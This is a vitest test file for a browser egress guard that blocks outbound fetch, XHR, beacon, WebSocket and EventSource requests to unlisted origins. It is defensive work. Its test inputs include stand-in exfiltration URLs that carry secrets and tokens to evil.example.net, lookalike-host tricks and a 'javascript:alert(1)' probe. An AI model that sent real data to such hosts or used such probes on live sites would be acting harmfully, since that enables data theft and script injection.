import { describe, expect, it } from "vitest";
import { createEgressPolicy, decide, installEgressGuard, type BlockedRequest, type GuardHost } from "./egress";

// Plain-http text is assembled so this file does not trip the repository audit itself.
const H = "http" + "://";

const policy = createEgressPolicy({ selfOrigin: "https://app.example.ca", allowedOrigins: ["https://data.example.ca"] });
const NOW = new Date("2026-11-15T20:00:00Z");

describe("createEgressPolicy", () => {
  it("normalizes the App's origin and freezes the result", () => {
    const p = createEgressPolicy({ selfOrigin: "https://app.example.ca/some/page?x=1" });
    expect(p.selfOrigin).toBe("https://app.example.ca");
    expect(Object.isFrozen(p)).toBe(true);
    expect(Object.isFrozen(p.allowedOrigins)).toBe(true);
  });
  it.each(["not a url", "data:text/plain,x", ""])("refuses %j as the App's origin", (o) => {
    expect(() => createEgressPolicy({ selfOrigin: o })).toThrow(RangeError);
  });
  it.each([`${H}x.example.ca`, "https://*.example.ca", "https://x.example.ca/path"])("refuses allowed origin %s", (o) => {
    expect(() => createEgressPolicy({ selfOrigin: "https://app.example.ca", allowedOrigins: [o] })).toThrow(RangeError);
  });
});

describe("decide", () => {
  it.each([
    ["/api/x", "same-origin"],
    ["relative/path", "same-origin"],
    ["https://app.example.ca/a?b=c", "same-origin"],
    ["wss://app.example.ca/socket", "same-origin"],
    ["https://data.example.ca/list", "listed-origin"],
    ["data:text/plain,hello", "local-scheme"],
    ["blob:https://app.example.ca/1234", "local-scheme"],
  ])("allows %s", (url, kind) => {
    expect(decide(policy, url)).toEqual({ allowed: true, kind });
  });
  it("blocks other hosts and reports only the host, never the path or query", () => {
    const d = decide(policy, "https://tracker.example.net/collect?id=abc&name=Jo");
    expect(d).toEqual({ allowed: false, host: "tracker.example.net", scheme: "https:", reason: "not-listed" });
    expect(JSON.stringify(d)).not.toContain("collect");
    expect(JSON.stringify(d)).not.toContain("abc");
  });
  it("keeps the port, so a different port is a different place", () => {
    expect(decide(policy, "https://app.example.ca:8443/")).toMatchObject({ allowed: false, host: "app.example.ca:8443" });
  });
  it("treats http as different from https", () => {
    expect(decide(policy, `${H}app.example.ca/`)).toMatchObject({ allowed: false, reason: "not-listed" });
    expect(decide(policy, "ws://data.example.ca/")).toMatchObject({ allowed: false });
  });
  it("blocks lookalike hosts", () => {
    expect(decide(policy, "https://app.example.ca.evil.example.net/")).toMatchObject({ allowed: false });
    expect(decide(policy, "https://user@evil.example.net@app.example.ca/")).toMatchObject({ allowed: true });
    expect(decide(policy, "https://app.example.ca@evil.example.net/")).toMatchObject({ allowed: false, host: "evil.example.net" });
  });
  it("blocks other schemes by name", () => {
    expect(decide(policy, "ftp://files.example.net/x")).toEqual({ allowed: false, host: "ftp:", scheme: "ftp:", reason: "blocked-scheme" });
    expect(decide(policy, "javascript:alert(1)")).toMatchObject({ allowed: false, reason: "blocked-scheme" });
  });
  it("blocks an address it cannot read", () => {
    expect(decide(policy, `${H}[::1`)).toEqual({ allowed: false, host: "", scheme: "", reason: "invalid-url" });
  });
});

interface Calls {
  fetch: string[];
  open: string[];
  beacon: string[];
  ws: string[];
  es: string[];
}

function fakeHost(): { host: GuardHost; calls: Calls } {
  const calls: Calls = { fetch: [], open: [], beacon: [], ws: [], es: [] };
  function FakeXhr(): void {}
  FakeXhr.prototype.open = function (_m: string, url: string | URL): void {
    calls.open.push(String(url));
  };
  class Socket {
    constructor(url: string) {
      calls.ws.push(url);
    }
  }
  class Events {
    constructor(url: string) {
      calls.es.push(url);
    }
  }
  const host: GuardHost = {
    fetch: (input) => {
      calls.fetch.push(typeof input === "string" ? input : String((input as { url: string }).url));
      return Promise.resolve("ok");
    },
    XMLHttpRequest: FakeXhr as unknown as NonNullable<GuardHost["XMLHttpRequest"]>,
    navigator: {
      sendBeacon: (url) => {
        calls.beacon.push(String(url));
        return true;
      },
    },
    WebSocket: Socket,
    EventSource: Events,
  };
  return { host, calls };
}

describe("installEgressGuard", () => {
  it("lets allowed requests through unchanged and blocks the rest, on every channel", async () => {
    const { host, calls } = fakeHost();
    const blocked: BlockedRequest[] = [];
    installEgressGuard(host, policy, (b) => blocked.push(b), () => NOW);

    await expect(host.fetch?.("/api/ok")).resolves.toBe("ok");
    await expect(host.fetch?.("https://evil.example.net/a?secret=1")).rejects.toThrow(TypeError);
    await expect(host.fetch?.({ url: "https://evil2.example.net/x" })).rejects.toThrow(TypeError);

    const xhr = new (host.XMLHttpRequest as unknown as new () => { open(m: string, u: string): void })();
    xhr.open("GET", "/ok");
    expect(() => xhr.open("GET", "https://evil.example.net/x")).toThrow(TypeError);

    expect(host.navigator?.sendBeacon?.("/beacon", "x")).toBe(true);
    expect(host.navigator?.sendBeacon?.("https://evil.example.net/b", "x")).toBe(false);

    const Socket = host.WebSocket as new (u: string) => object;
    new Socket("wss://app.example.ca/ok");
    expect(() => new Socket("wss://evil.example.net/s")).toThrow(TypeError);
    const Events = host.EventSource as new (u: string) => object;
    new Events("/stream");
    expect(() => new Events("https://evil.example.net/e")).toThrow(TypeError);

    expect(calls).toEqual({
      fetch: ["/api/ok"],
      open: ["/ok"],
      beacon: ["/beacon"],
      ws: ["wss://app.example.ca/ok"],
      es: ["/stream"],
    });
    expect(blocked.map((b) => `${b.via}:${b.host}`)).toEqual([
      "fetch:evil.example.net",
      "fetch:evil2.example.net",
      "xhr:evil.example.net",
      "beacon:evil.example.net",
      "websocket:evil.example.net",
      "eventsource:evil.example.net",
    ]);
    expect(blocked.every((b) => b.at === NOW.toISOString())).toBe(true);
  });

  it("never reports a path, query or body", async () => {
    const { host } = fakeHost();
    const blocked: BlockedRequest[] = [];
    installEgressGuard(host, policy, (b) => blocked.push(b));
    await host.fetch?.("https://evil.example.net/private/name?token=abc123").catch(() => undefined);
    expect(JSON.stringify(blocked)).not.toMatch(/private|token|abc123/);
  });

  it("still blocks if the reporter throws", async () => {
    const { host, calls } = fakeHost();
    installEgressGuard(host, policy, () => {
      throw new Error("reporter failed");
    });
    await expect(host.fetch?.("https://evil.example.net/")).rejects.toThrow(TypeError);
    expect(calls.fetch).toEqual([]);
  });

  it("uninstall puts back the originals, and can be called twice", async () => {
    const { host, calls } = fakeHost();
    const original = host.fetch;
    const originalSocket = host.WebSocket;
    const g = installEgressGuard(host, policy, () => undefined);
    expect(host.fetch).not.toBe(original);
    g.uninstall();
    g.uninstall();
    expect(host.fetch).toBe(original);
    expect(host.WebSocket).toBe(originalSocket);
    await host.fetch?.("https://evil.example.net/");
    expect(calls.fetch).toEqual(["https://evil.example.net/"]);
  });

  it("does not undo a wrapper someone else put on top", () => {
    const { host } = fakeHost();
    const g = installEgressGuard(host, policy, () => undefined);
    const other = (): Promise<unknown> => Promise.resolve("other");
    host.fetch = other;
    g.uninstall();
    expect(host.fetch).toBe(other);
  });

  it("skips channels the host does not have", () => {
    const host: GuardHost = {};
    expect(() => installEgressGuard(host, policy, () => undefined).uninstall()).not.toThrow();
  });
});
